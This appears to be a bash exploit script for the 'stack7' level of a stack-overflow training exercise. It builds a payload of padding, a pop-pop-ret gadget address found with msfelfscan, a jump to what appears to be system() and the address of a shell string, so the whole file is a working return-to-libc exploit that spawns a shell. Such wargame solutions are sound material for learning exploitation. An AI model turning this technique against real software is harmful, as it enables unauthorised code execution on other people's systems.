#!/bin/bash
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

offset="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

# Use msfelfscan from metasploit to analyze the binary
# Do `msfelfscan -p stack7` to list "pop pop ret" occurences
# Used the first one -- x08048492
poppopret=`$DIR/encode_switch_endianness.sh 8048492`

# Provide some input for the two `pop` instructions
poppop="BBBBCCCC"

# See the previous solution for explanation
jmp=`$DIR/encode_switch_endianness.sh b7ecffb0`
return_addr="AAAA"
shellpath=`$DIR/encode_switch_endianness.sh b7fb63bf`

echo "$offset$poppopret$poppop$jmp$return_addr$shellpath"
